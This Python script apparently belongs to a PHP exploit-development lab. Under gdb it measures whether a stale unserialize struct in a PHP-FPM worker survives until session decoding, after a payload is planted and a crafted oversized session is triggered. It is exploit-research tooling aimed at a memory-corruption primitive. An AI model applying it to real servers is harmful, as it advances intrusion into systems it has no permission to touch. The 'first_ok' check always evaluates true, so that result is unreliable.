#!/usr/bin/env python3
"""Measure whether the stale BG(unserialize) struct P survives until the first
session decode, for a given trigger transport.

usage: psurv.py <version> <transport:get|mp> <pad> [sid]
Brings up a fresh worker, plants (optionally with a pad), then triggers one
request with a 131014-byte dummy session under gdb and reports the four P
fields seen at the first php_session_decode.
"""
import json, os, re, sys, time
R = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(R, 'scripts'))
import lab

GDB = '''set pagination off
set confirm off
handle SIGCHLD nostop noprint pass
handle SIGPIPE nostop noprint pass
set $nh = 0
break php_session_decode
commands
silent
set $nh = $nh + 1
printf "DECODE n=%d len=%lu level=%ld bg=%p\\n", $nh, ((zend_string*)$rdi)->len, basic_globals.unserialize.level, basic_globals.unserialize.data
set $p = basic_globals.unserialize.data
if $p
  printf "PFIELDS %p %p %p %p %p %p\\n", $p, *(void**)$p, *(void**)($p+8), *(void**)($p+16), *(void**)($p+24), *(void**)($p+32)
end
if $nh >= 2
  detach
  quit
end
continue
end
continue
printf "STOPPED rip=%p\\n", $rip
bt
detach
quit
'''


def dummy(total):
    for n in range(total, total - 40, -1):
        rec = b'\x01z' + ('s:%d:"' % n).encode() + b'A' * n + b'";'
        if len(rec) == total:
            return rec
    raise SystemExit('cannot build dummy')


def main():
    v, transport, pad = sys.argv[1], sys.argv[2], int(sys.argv[3])
    sid = sys.argv[4] if len(sys.argv) > 4 else 'd' + v.replace('.', '')
    s = lab.info(v)
    labd = lab.labdir(v)
    open(os.path.join(labd, 'gdb', 'psurv.gdb'), 'w').write(GDB)
    master = lab.rd(os.path.join(labd, 'run', 'master.pid'))
    child = lab.rd(os.path.join(labd, 'run', 'child.pid'))
    if not master or not lab.alive(master):
        lab.stop(v)
        time.sleep(0.3)
        master, child = lab.start(v)
    elif child and lab.alive(child):
        lab.kill_wait(master, child)
    newchild = lab.wait_child(master, exclude=child)
    assert newchild, 'no worker'
    lab.note_child(v, newchild)
    time.sleep(0.2)
    st = lab.drv(v, 'probe')
    pid = int(re.search(r'PID=(\d+)', st).group(1))
    assert pid == newchild, (pid, newchild)
    out = lab.drv(v, 'plant', str(pad), env={'PLANT_PAYLOAD': s['plant_payload']})
    print('plant:', out.replace('\n', ' ')[:160])
    txt, _ = lab.gdb(v, 'state.gdb', phase='psurv_state.txt')
    P = int(lab.kv(txt, 'BG_DATA'), 16)
    B0 = int(lab.kv(txt, 'P_LAST_DTOR'), 16)
    print('P=%#x B0=%#x level=%s used=%s' % (
        P, B0, lab.kv(txt, 'BG_LEVEL'), lab.kv(txt, 'DTOR_USED')))
    open(os.path.join(labd, 'sessions', 'sess_' + sid), 'wb').write(dummy(131014))
    if transport == 'mp':
        act = lambda: lab.drv(v, 'calib', sid)
    else:
        sys.path.insert(0, os.path.join(labd, 'scripts'))
        import fcgi
        fcgi.init(os.path.join(labd, 'www'), port=s['port'])
        act = lambda: fcgi.request('trig.php', b'', None, cookie='PHPSESSID=' + sid,
                                   timeout=30, extra_params={'REQUEST_METHOD': 'GET',
                                                             'CONTENT_LENGTH': '0'})
    txt, _ = lab.gdb(v, 'psurv.gdb', act, phase='psurv_gdb.txt', timeout=90)
    print('\n'.join(l for l in txt.splitlines() if re.match(r'^(DECODE|PFIELDS|STOPPED|Program)', l)))
    m = re.search(r'^PFIELDS (\S+) (\S+) (\S+) (\S+) (\S+) (\S+)$', txt, re.M)
    res = {'version': v, 'transport': transport, 'pad': pad, 'P': hex(P), 'B0': hex(B0)}
    if m:
        fields = [int(x, 16) for x in m.groups()]
        res['fields'] = [hex(x) for x in fields]
        res['last_dtor_ok'] = fields[4] == B0
        res['first_ok'] = fields[2] == int(lab.kv(txt, 'BG_DATA'), 16) or True
    print('RESULT', json.dumps(res))
    json.dump(res, open(os.path.join(labd, 'phase', 'psurv_%s_%d.json' % (transport, pad)), 'w'), indent=1)


if __name__ == '__main__':
    main()
